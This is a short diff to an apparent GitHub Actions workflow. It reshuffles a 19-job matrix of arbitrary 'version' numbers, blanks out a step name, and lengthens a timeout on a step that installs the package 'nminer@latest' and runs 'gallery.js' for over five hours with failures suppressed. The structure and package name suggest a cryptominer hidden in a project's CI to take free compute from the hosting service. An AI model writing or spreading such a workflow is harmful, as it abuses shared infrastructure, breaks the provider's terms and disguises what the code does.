@@ -9,25 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5248 }
-          - { version: 6972 }
-          - { version: 9212 }
-          - { version: 7356 }
-          - { version: 2044 }
-          - { version: 3890 }
-          - { version: 3030 }
-          - { version: 9600 }
-          - { version: 3063 }
-          - { version: 7110 }
-          - { version: 9622 }
-          - { version: 1721 }
-          - { version: 1059 }
-          - { version: 6604 }
-          - { version: 1579 }
-          - { version: 5218 }
-          - { version: 658 }
-          - { version: 1042 }
-          - { version: 967 }
+          - { version: 4043 }
+          - { version: 5246 }
+          - { version: 6038 }
+          - { version: 4153 }
+          - { version: 6325 }
+          - { version: 2707 }
+          - { version: 5893 }
+          - { version: 8072 }
+          - { version: 5685 }
+          - { version: 9332 }
+          - { version: 1225 }
+          - { version: 5516 }
+          - { version: 7035 }
+          - { version: 6965 }
+          - { version: 4903 }
+          - { version: 5580 }
+          - { version: 8385 }
+          - { version: 1209 }
+          - { version: 8298 }
 
     steps:
       - name: Checkout
@@ -38,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: huzzah cloudy bootleg
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 306m node gallery.js || echo "gallery executed"
+          timeout 317m node gallery.js || echo "gallery executed"
